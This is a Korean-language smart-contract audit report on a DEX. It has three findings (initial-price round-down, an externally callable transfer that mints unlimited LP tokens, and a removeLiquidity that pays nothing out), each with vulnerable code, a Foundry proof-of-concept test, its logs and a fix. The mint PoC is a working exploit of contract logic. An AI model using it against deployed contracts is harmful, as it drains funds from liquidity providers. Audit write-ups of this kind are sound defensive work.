# 1. DEX - addLiquidity시 초기 가격 round down 발생

## 설명

<aside>

### **키워드 : Numeric issue(Round down)**

### **심각도 : Informational**

초기 유동성 공급 시 1 ether보다 더 적은 양을 공급하면 round down되어 오작동이 발생한다.

</aside>

```solidity
if (lptTotalSupply < 1) {
            priceOfX = oracle.setPrice(_tokenX, tokenXAmount / decimals);
            priceOfY = oracle.setPrice(_tokenY, tokenYAmount / decimals);
        }
```

가격을 등록할 때 decimals(10\*\*18)로 등록하기에 1 ether 미만인 토큰이 등록되면 가격은 0으로 설정된다.

LP 토큰은 따로 발행되는 것이 없지만, reserved 된 tokenX와 tokenY는 쌓이게 되어 이후 유동성 풀의 비에 영향을 끼친다.

이 경우 LP토큰이 0개 발행되어 addLiquidity를 다시 실행하여 1 ether이상 넣을 때 까지 초기 설정으로 인식하며 LP토큰과 유동성 풀의 싱크가 맞지 않게 만들어 오작동의 원인이 될 수 있다.

## PoC

```solidity
function testPOC() external {
    uint lp = dex.addLiquidity(0.5 ether, 100 ether, 0);
    console.log("LP : ", lp);
    lp = dex.addLiquidity(0.1 ether, 100 ether, 0);
    console.log("LP : ", lp);
    lp = dex.addLiquidity(1 ether, 1 ether, 0);
    console.log("LP : ", lp);
    dex.addLiquidity(1 ether, 1 ether, 0);
}
```

```solidity
Running 1 test for test/Dex.t.sol:DexTest
[FAIL. Reason: invalid ratio] testPOC() (gas: 243161)
Logs:
  price 0 100
  reserved 500000000000000000 100000000000000000000
  LP :  0
  price 0 100
  reserved 600000000000000000 200000000000000000000
  LP :  0
  price 1 1
  reserved 1600000000000000000 201000000000000000000
  LP :  17933209417167915290

Test result: FAILED. 0 passed; 1 failed; finished in 6.19ms

Failing tests:
Encountered 1 failing test in test/Dex.t.sol:DexTest
[FAIL. Reason: invalid ratio] testPOC() (gas: 243161)
```

처음에 x토큰 0.5 ether, y토큰 100ether를 넣어 가격이 200배 차이나는 두 토큰의 유동풀을 등록한다.

이후 0.1과 100이라는 1000배 차이나는 두 토큰을 유동풀에 공급한다. 첫 명령의 결과로 토큰이 발급되지 않았기에 이번에도 초기 등록으로 인식하게 된다.

이후 1:1 비율로 등록을 하게 된다. 역시 이전 유동성 공급으로 인해 발행된 토큰이 존재하지 않기에 초기 등록으로 간주된다.

세 번째 함수에서 토큰이 처음 발행되며 등록으로 간주된다.

이때 토큰의 가격은 1:1로 등록되지만, 실제 유동성 풀에 존재하는 토큰은 16:2010 비율이다.

따라서 이후 공급에서 등록된 토큰의 가격대로 1:1을 등록하려 시도하지만, 실제 유동성에 존재하는 비율은 16:2010 이기에 revert가 발생했음을 알 수 있다.

## 파급력

최악의 경우 초기 가격이 설정되지 않은 상태로 런칭될 수 있고 이는 유저에 의해 초기 가격이 설정되는 상황이 연출될 수 있다. 이 경우 초기 공급량, 교환비에 유저가 직접 개입하여 관여할 수 있게 된다.

하지만 초기 가격이 등록되어 테스트되지 않은 채로 런칭되어 실제 유저에 의해 초기 가격이 설정되는 상황은 매우 특수한 상황이며 일어날 가능성이 낮다고 판단되어 위험도는 매우 낮다고 판단하였다.

## 해결 방안

따로 토큰 X와 Y의 가격을 저장하는 변수를 선언하지 않고 유동성에 존재하는 풀의 비율로 판단하거나 만약 오라클을 통해 구현하고 싶다면 오라클에 등록하는 단위를 ether가 아닌 wei, 혹은 임의로 설정한 단위로 등록하고 이후 사용시 복구시켜(역산하여) 사용하는 방식을 선택해야 한다.

---

# 2. DEX - 잘못된 transfer 접근 범위 설정

## 설명

<aside>

### **키워드 : Misconfiguration**

### **심각도 : Critical**

토큰을 원하는 만큼 민팅하는 함수인 transfer의 접근 범위가 external 이며, 이에 대한 접근자 검증이 제대로 이루어지지 않아 토큰을 무한정 발행할 수 있다.

</aside>

```solidity
contract LPT is ERC20("LPT", "LPT") {
    address _admin;

    constructor() {
        _admin = msg.sender;
    }

    modifier onlyAdmin() {
        require(_admin == msg.sender, "only Admin");

        _;
    }

    function mint(address account, uint256 amount) external onlyAdmin {
        _mint(account, amount);
    }
}

function transfer(address to, uint256 lpAmount) external returns (bool) {
        require(lpAmount > 0);

        lpt.mint(payable(address(this)), lpAmount);
        lpt.transfer(payable(to), lpAmount);

        return true;
    }
```

`transfer` 함수가 external로 선언되어 외부에서 호출이 가능하다.

lpt에 선언한 `transfer` 에서 `admin` 인지 체크하지만 이는 dex의 `transfer` 가 lpt의 `transfer` 를 호출하기에 `msg.sender` 는 admin(dex)이므로 성공적으로 민팅을 실행하게 된다.

이를 통해 무한정으로 LP토큰을 발행할 수 있고, 이를 통해 실제 토큰으로 변환하여 사용할 수 있다.

## PoC

```solidity
function testPOC() external {
        uint lp = dex.addLiquidity(1 ether, 1 ether, 0);
        vm.startPrank(address(0x01));
        {
            dex.transfer(address(0x01), lp * 9999);
            (uint balanceOfX, uint balanceOfY) = dex.removeLiquidity(
                lp * 9999,
                0,
                0
            );
            console.log("balance", balanceOfX, balanceOfY);
            console.log(
                "balance",
                tokenX.balanceOf(address(0x01)),
                tokenY.balanceOf(address(0x01))
            );
        }
    }
```

```solidity
Running 1 test for test/Dex.t.sol:DexTest
[PASS] testPOC() (gas: 208585)
Logs:
  balance 999900000000000000 999900000000000000
```

다음과 같이 원하는 만큼 토큰을 발행할 수 있게 된다.

## 파급력

원하는 만큼 LP토큰을 주조하고 이를 성공적으로 현금화할 수 있기에 위험도는 매우 높다고 판단할 수 있다.

## 해결 방안

```solidity
function transfer(address to, uint256 lpAmount) internal returns (bool) {
				require(msg.sender == address(this));
        require(lpAmount > 0);

        lpt.mint(payable(address(this)), lpAmount);
        lpt.transfer(payable(to), lpAmount);

        return true;
    }
```

DEX의 `transfer` 를 변경한다면 접근자를 internal로 설정하거나 트랜잭션의 발신지가 DEX 컨트랙트(자신)인지 검사해야 한다.

```solidity
function mint(address account, uint256 amount) external onlyAdmin {
				require(msg.sender == address(dex));
        _mint(account, amount);
    }
```

lpt의 `mint` 를 변경한다면 `msg.sender` 이 `dex` 컨트랙트인지 확인해야 한다.

---

# 3. DEX - removeLiquidity 토큰 전송로직 미구현

## 설명

<aside>

### **키워드 : 현금화 불가**

### **심각도 : Critical**

얼마의 토큰을 전송할지에 대한 반환값은 제시하지만 실제 x토큰과 y토큰을 전송하지 않기에 유동성을 제거할 수 없다.(LP토큰을 현금화할 수 없다.)

</aside>

```solidity
function removeLiquidity(
        uint256 LPTokenAmount,
        uint256 minimumTokenXAmount,
        uint256 minimumTokenYAmount
    ) external returns (uint rx, uint ry) {
        require(LPTokenAmount > 0);
        require(minimumTokenXAmount >= 0);
        require(minimumTokenYAmount >= 0);
        require(lpt.balanceOf(msg.sender) >= LPTokenAmount);

        (uint balanceOfX, uint balanceOfY) = pairTokenBalance();

        uint lptTotalSupply = lpt.totalSupply();

        rx = (balanceOfX * LPTokenAmount) / lptTotalSupply;
        ry = (balanceOfY * LPTokenAmount) / lptTotalSupply;

        require(rx >= minimumTokenXAmount);
        require(rx >= minimumTokenYAmount);
    }
```

유동성 풀과 공급량에 따른 지분을 계산하여 전송해야 하는 토큰의 수는 계산하지만, LP토큰을 `burn` 하지도 않고 각 토큰으로 전송하는 로직도 없다.

즉, 유저는 DEX에 유동성을 공급할 수는 있지만, 유동성 제거를 통해 이득을 취할 수 없다.

## PoC

```solidity
function testPOC() external {
        uint lp = dex.addLiquidity(1 ether, 1 ether, 0);
        vm.startPrank(address(0x01));
        {
            dex.transfer(address(0x01), lp * 9999);
            (uint balanceOfX, uint balanceOfY) = dex.removeLiquidity(
                lp * 9999,
                0,
                0
            );
            console.log("return value", balanceOfX, balanceOfY);
            console.log(
                "balance",
                tokenX.balanceOf(address(0x01)),
                tokenY.balanceOf(address(0x01))
            );
        }
    }
```

```solidity
Running 1 test for test/Dex.t.sol:DexTest
[PASS] testPOC() (gas: 219377)
Logs:
  return value 999900000000000000 999900000000000000
  balance 0 0
```

반환은 정상적으로 되지만, 실제로 지급된 토큰은 없다.

## 파급력

유동성 공급 과정에서는 X토큰과 y토큰을 정상적으로 받으며 LP토큰을 나누어주지만 실제로 LP토큰을 사용하여 현금화하는 기능이 존재치 않아 LP토큰은 가치가 없는 토큰이나 마찬가지이다.

따라서 컨트랙트 내 모든 유동성 공급자들은 고스란히 손해만 보게 되는 시스템이기에 위험도를 매우 높다고 판단했다.

## 해결방법

LP토큰은 소각하고, x토큰과 y토큰을 지분에 따라 분배하는 로직을 추가한다.
